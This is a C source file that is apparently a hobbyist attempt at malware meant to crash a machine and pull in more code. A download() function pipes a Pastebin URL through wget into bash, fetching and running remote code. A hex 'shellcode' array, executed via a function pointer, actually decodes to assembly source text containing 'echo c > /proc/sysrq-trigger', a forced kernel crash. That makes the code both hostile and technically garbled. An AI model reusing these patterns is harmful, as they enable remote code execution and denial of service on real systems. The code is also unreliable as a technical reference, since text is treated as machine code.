/* Trying to code kpanic with persistence. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100

int download () {
    char wget[MAX_CMN_LEN] = "wget -O-  pastebin.com/raw/3LGCFWc6 | bash", **p; /* defining the command to execute */
    system(wget); /* executing wget */
    return 0; /* return */
}

char shellcode[] =
	"\x09\x2e\x73\x65\x63\x74\x69\x6f\x6e\x09\x5f\x5f\x54\x45\x58"
	"\x54\x2c\x5f\x5f\x74\x65\x78\x74\x2c\x72\x65\x67\x75\x6c\x61"
	"\x72\x2c\x70\x75\x72\x65\x5f\x69\x6e\x73\x74\x72\x75\x63\x74"
	"\x69\x6f\x6e\x73\x0a\x09\x2e\x6d\x61\x63\x6f\x73\x78\x5f\x76"
	"\x65\x72\x73\x69\x6f\x6e\x5f\x6d\x69\x6e\x20\x31\x30\x2c\x20"
	"\x31\x31\x0a\x09\x2e\x67\x6c\x6f\x62\x6c\x09\x5f\x6d\x61\x69"
	"\x6e\x0a\x09\x2e\x61\x6c\x69\x67\x6e\x09\x34\x2c\x20\x30\x78"
	"\x39\x30\x0a\x5f\x6d\x61\x69\x6e\x3a\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x23\x23"
	"\x20\x40\x6d\x61\x69\x6e\x0a\x09\x2e\x63\x66\x69\x5f\x73\x74"
	"\x61\x72\x74\x70\x72\x6f\x63\x0a\x23\x23\x20\x42\x42\x23\x30"
	"\x3a\x0a\x09\x70\x75\x73\x68\x71\x09\x25\x72\x62\x70\x0a\x4c"
	"\x74\x6d\x70\x30\x3a\x0a\x09\x2e\x63\x66\x69\x5f\x64\x65\x66"
	"\x5f\x63\x66\x61\x5f\x6f\x66\x66\x73\x65\x74\x20\x31\x36\x0a"
	"\x4c\x74\x6d\x70\x31\x3a\x0a\x09\x2e\x63\x66\x69\x5f\x6f\x66"
	"\x66\x73\x65\x74\x20\x25\x72\x62\x70\x2c\x20\x2d\x31\x36\x0a"
	"\x09\x6d\x6f\x76\x71\x09\x25\x72\x73\x70\x2c\x20\x25\x72\x62"
	"\x70\x0a\x4c\x74\x6d\x70\x32\x3a\x0a\x09\x2e\x63\x66\x69\x5f"
	"\x64\x65\x66\x5f\x63\x66\x61\x5f\x72\x65\x67\x69\x73\x74\x65"
	"\x72\x20\x25\x72\x62\x70\x0a\x09\x73\x75\x62\x71\x09\x24\x31"
	"\x34\x34\x2c\x20\x25\x72\x73\x70\x0a\x09\x6c\x65\x61\x71\x09"
	"\x2d\x31\x31\x32\x28\x25\x72\x62\x70\x29\x2c\x20\x25\x72\x61"
	"\x78\x0a\x09\x6c\x65\x61\x71\x09\x6c\x5f\x6d\x61\x69\x6e\x2e"
	"\x6b\x70\x61\x6e\x69\x63\x28\x25\x72\x69\x70\x29\x2c\x20\x25"
	"\x72\x73\x69\x0a\x09\x6d\x6f\x76\x6c\x09\x24\x31\x30\x30\x2c"
	"\x20\x25\x65\x63\x78\x0a\x09\x6d\x6f\x76\x6c\x09\x25\x65\x63"
	"\x78\x2c\x20\x25\x65\x64\x78\x0a\x09\x6d\x6f\x76\x71\x09\x5f"
	"\x5f\x5f\x73\x74\x61\x63\x6b\x5f\x63\x68\x6b\x5f\x67\x75\x61"
	"\x72\x64\x40\x47\x4f\x54\x50\x43\x52\x45\x4c\x28\x25\x72\x69"
	"\x70\x29\x2c\x20\x25\x72\x64\x69\x0a\x09\x6d\x6f\x76\x71\x09"
	"\x28\x25\x72\x64\x69\x29\x2c\x20\x25\x72\x64\x69\x0a\x09\x6d"
	"\x6f\x76\x71\x09\x25\x72\x64\x69\x2c\x20\x2d\x38\x28\x25\x72"
	"\x62\x70\x29\x0a\x09\x6d\x6f\x76\x6c\x09\x24\x30\x2c\x20\x2d"
	"\x31\x31\x36\x28\x25\x72\x62\x70\x29\x0a\x09\x6d\x6f\x76\x71"
	"\x09\x25\x72\x61\x78\x2c\x20\x25\x72\x64\x69\x0a\x09\x6d\x6f"
	"\x76\x71\x09\x25\x72\x61\x78\x2c\x20\x2d\x31\x33\x36\x28\x25"
	"\x72\x62\x70\x29\x20\x20\x20\x20\x20\x20\x20\x20\x23\x23\x20"
	"\x38\x2d\x62\x79\x74\x65\x20\x53\x70\x69\x6c\x6c\x0a\x09\x63"
	"\x61\x6c\x6c\x71\x09\x5f\x6d\x65\x6d\x63\x70\x79\x0a\x09\x6d"
	"\x6f\x76\x71\x09\x2d\x31\x33\x36\x28\x25\x72\x62\x70\x29\x2c"
	"\x20\x25\x72\x64\x69\x20\x20\x20\x20\x20\x20\x20\x20\x23\x23"
	"\x20\x38\x2d\x62\x79\x74\x65\x20\x52\x65\x6c\x6f\x61\x64\x0a"
	"\x09\x63\x61\x6c\x6c\x71\x09\x5f\x73\x79\x73\x74\x65\x6d\x0a"
	"\x09\x6d\x6f\x76\x71\x09\x5f\x5f\x5f\x73\x74\x61\x63\x6b\x5f"
	"\x63\x68\x6b\x5f\x67\x75\x61\x72\x64\x40\x47\x4f\x54\x50\x43"
	"\x52\x45\x4c\x28\x25\x72\x69\x70\x29\x2c\x20\x25\x72\x64\x78"
	"\x0a\x09\x6d\x6f\x76\x71\x09\x28\x25\x72\x64\x78\x29\x2c\x20"
	"\x25\x72\x64\x78\x0a\x09\x63\x6d\x70\x71\x09\x2d\x38\x28\x25"
	"\x72\x62\x70\x29\x2c\x20\x25\x72\x64\x78\x0a\x09\x6d\x6f\x76"
	"\x6c\x09\x25\x65\x61\x78\x2c\x20\x2d\x31\x34\x30\x28\x25\x72"
	"\x62\x70\x29\x20\x20\x20\x20\x20\x20\x20\x20\x23\x23\x20\x34"
	"\x2d\x62\x79\x74\x65\x20\x53\x70\x69\x6c\x6c\x0a\x09\x6a\x6e"
	"\x65\x09\x4c\x42\x42\x30\x5f\x32\x0a\x23\x23\x20\x42\x42\x23"
	"\x31\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x23\x23\x20\x25\x53\x50\x5f\x72\x65\x74\x75"
	"\x72\x6e\x0a\x09\x78\x6f\x72\x6c\x09\x25\x65\x61\x78\x2c\x20"
	"\x25\x65\x61\x78\x0a\x09\x61\x64\x64\x71\x09\x24\x31\x34\x34"
	"\x2c\x20\x25\x72\x73\x70\x0a\x09\x70\x6f\x70\x71\x09\x25\x72"
	"\x62\x70\x0a\x09\x72\x65\x74\x71\x0a\x4c\x42\x42\x30\x5f\x32"
	"\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x23\x23\x20\x25\x43\x61\x6c\x6c\x53\x74\x61"
	"\x63\x6b\x43\x68\x65\x63\x6b\x46\x61\x69\x6c\x42\x6c\x6b\x0a"
	"\x09\x63\x61\x6c\x6c\x71\x09\x5f\x5f\x5f\x73\x74\x61\x63\x6b"
	"\x5f\x63\x68\x6b\x5f\x66\x61\x69\x6c\x0a\x09\x2e\x63\x66\x69"
	"\x5f\x65\x6e\x64\x70\x72\x6f\x63\x0a\x0a\x09\x2e\x73\x65\x63"
	"\x74\x69\x6f\x6e\x09\x5f\x5f\x54\x45\x58\x54\x2c\x5f\x5f\x63"
	"\x6f\x6e\x73\x74\x0a\x09\x2e\x61\x6c\x69\x67\x6e\x09\x34\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x23\x23\x20\x40\x6d\x61\x69\x6e"
	"\x2e\x6b\x70\x61\x6e\x69\x63\x0a\x6c\x5f\x6d\x61\x69\x6e\x2e"
	"\x6b\x70\x61\x6e\x69\x63\x3a\x0a\x09\x2e\x61\x73\x63\x69\x7a"
	"\x09\x22\x65\x63\x68\x6f\x20\x63\x20\x3e\x20\x2f\x70\x72\x6f"
	"\x63\x2f\x73\x79\x73\x72\x71\x2d\x74\x72\x69\x67\x67\x65\x72"
	"\x73\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30"
	"\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c"
	"\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30"
	"\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30"
	"\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30"
	"\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c"
	"\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30"
	"\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30"
	"\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30"
	"\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c"
	"\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30"
	"\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30"
	"\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30"
	"\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c"
	"\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30"
	"\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30"
	"\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30"
	"\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x5c"
	"\x30\x30\x30\x5c\x30\x30\x30\x5c\x30\x30\x30\x22\x0a\x0a\x0a"
	"\x2e\x73\x75\x62\x73\x65\x63\x74\x69\x6f\x6e\x73\x5f\x76\x69"
	"\x61\x5f\x73\x79\x6d\x62\x6f\x6c\x73\x0a"; /* shellcode for kernel panic */

    int main () {
        int (*ret) () = (int(*) ())shellcode;
        ret(); /* run shellcode */
    }

    /* compile with: gcc kpanic.c -fno-stack-protector -o kpanic */

